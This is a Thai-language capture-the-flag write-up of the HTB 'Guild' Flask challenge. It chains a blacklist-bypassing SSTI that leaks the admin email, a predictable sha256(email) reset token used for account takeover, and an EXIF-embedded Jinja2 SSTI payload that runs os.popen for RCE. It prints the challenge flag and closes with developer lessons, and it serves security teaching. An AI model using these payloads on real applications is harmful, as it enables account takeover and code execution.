# Guild — HTB Web Challenge Writeup

**Category:** Web
**Flag:** `HTB{mult1pl3_lo0p5_mult1pl3_h0les_a6b39ef4c84730db1f51dd0482b249a0}`

---

## คำอธิบายโจทย์

> Welcome to the Guild ! But please wait until our Guild Master verify you. Thanks for the wait

เว็บแอป Flask ที่ผู้ใช้สมัครสมาชิก, อัปโหลดเอกสาร (รูป) เพื่อขอ verify จาก "Guild Master" (admin)

---

## สรุปช่องโหว่

โจทย์นี้ต้องเชื่อม 3 ช่องโหว่เข้าด้วยกัน (ตรงกับชื่อ flag: *multiple loops, multiple holes*)

| # | จุด | ประเภท |
|---|-----|--------|
| 1 | `/user/<link>` (bio) | SSTI (มี blacklist) → leak admin email |
| 2 | `/forgetpassword` + `/changepasswd` | Predictable Reset Token → Account Takeover |
| 3 | `/verify` (EXIF Artist) | Unfiltered SSTI → RCE → อ่าน flag |

---

## รายละเอียด

### 1. SSTI ใน `/user/<link>` → leak admin email

`views.py` ฟังก์ชัน `share()` ทำ Python string formatting (`%`) ก่อน แล้วค่อยส่งเข้า Jinja2:

```python
temp = open("shareprofile.html").read()        # template มี %s
return render_template_string(temp % bio, User=User, ...)
```

ค่า `bio` (ที่เราควบคุมได้ผ่าน `/profile`) ถูกแทรกลง template ด้วย `%` ก่อน Jinja2 render
ดังนั้นถ้า bio มี `{{ ... }}` จะถูกประมวลผลเป็น Jinja2 expression

`checkInput()` มี blacklist หนัก (`__`, `[`, `]`, `class`, `os`, `globals`, `%`, `*`, `main`, ...)
แต่ object `User` ถูกส่งเข้า template context ให้แล้ว และเราเลี่ยงคำว่า `admin`
(ตรงกับ blacklist `main`) ด้วย Jinja2 `~` (string concat) operator:

```jinja
{{User.query.filter_by(username="adm"~"in").first().email}}
```

**ผลลัพธ์:** admin email = `4868504b72424f6a@master.guild`
(อีเมลนี้สุ่มตอนสร้าง container — ต้อง leak เอาทุกครั้ง)

---

### 2. Password Reset Token ที่เดาได้ → Account Takeover

`/forgetpassword` สร้าง reset token จาก sha256 ของอีเมลตรงๆ:

```python
reset_url = str(hashlib.sha256(email.encode()).hexdigest())
new_query = Validlinks(email=email, validlink=reset_url)
```

Token = `sha256(email)` → เรารู้ admin email แล้ว จึงคำนวณ token เองได้

```python
token = hashlib.sha256(admin_email.encode()).hexdigest()
```

จากนั้น POST password ใหม่ไปที่ `/changepasswd/<token>`:

```python
@views.route("/changepasswd/<Hash>", methods=["GET", "POST"])
def changepasswd(Hash):
    query = Validlinks.query.filter_by(validlink=Hash).first()
    ...
    query1.password = generate_password_hash(new_password, ...)
```

**ผลลัพธ์:** ตั้งรหัสผ่าน admin ใหม่ → login เป็น admin ได้

---

### 3. Unfiltered SSTI ใน `/verify` → RCE

`/verify` เป็น endpoint ของ admin เท่านั้น มันเปิดรูป verification แล้วอ่าน EXIF
`Artist` tag **โดยไม่กรองอะไรเลย** แล้วยัดเข้า `render_template_string`:

```python
img = Image.open(query.doc)
for k, v in img.getexif().items():
    tag = TAGS.get(k)
    exif_table[tag] = v
if "Artist" in exif_table.keys():
    sec_code = exif_table["Artist"]
    return render_template_string("Verified! {}".format(sec_code))  # SSTI
```

ก่อนหน้านี้ (ตอน register) เราอัปโหลดรูป JPEG ที่ฝัง EXIF `Artist` เป็น payload:

```jinja
{{lipsum.__globals__.os.popen('cat /app/flag.txt').read()}}
```

> หมายเหตุ gadget: `lipsum` (helper ของ Jinja) อยู่ในโมดูล `jinja2.utils` ซึ่ง
> `import os` ไว้แล้ว ดังนั้น `lipsum.__globals__.os` เข้าถึง `os` module ได้โดยตรง
> และ endpoint นี้ไม่มี blacklist จึงใช้ `__`, `os`, `globals` ได้เต็มที่

พอ login เป็น admin แล้ว เรา call `/verify` กับ verification ของตัวเองได้เลย
ไม่ต้องรอ bot → payload รัน → flag โผล่ใน response body

```
Verified! HTB{mult1pl3_lo0p5_mult1pl3_h0les_a6b39ef4c84730db1f51dd0482b249a0}
```

---

## Exploit Chain (Timeline)

```
1. Register user + Upload JPEG (EXIF Artist = SSTI RCE payload)
2. Set bio = SSTI leak payload
3. /getlink -> /user/<me>  ->  leak admin email
4. token = sha256(admin_email)
5. /forgetpassword (admin email)  ->  /changepasswd/<token>  ->  ตั้ง password admin
6. Login as admin
7. /verify (verification_id ของเรา)  ->  "Verified! HTB{...}"
```

---

## สิ่งที่เรียนรู้ / บทเรียนสำหรับ Dev

- **อย่าทำ string formatting (`%`, `.format`, f-string) ก่อน `render_template_string`** — เป็น SSTI ทันที ใช้ Jinja2 context variable / autoescape แทน
- **Reset token ต้องสุ่มและคาดเดาไม่ได้** — `sha256(email)` คำนวณซ้ำได้ ไม่ปลอดภัย ควรใช้ token แบบสุ่ม + หมดอายุ
- **EXIF metadata คือ untrusted input** — ต้อง sanitize/escape ก่อนนำไป render
- **Blacklist ไม่ใช่ทางแก้ SSTI** — `/profile` พยายาม blacklist แต่ `/verify` ลืมกรอง → หลุดเลย ควรใช้ sandbox / ไม่ render user input เป็น template เลย
```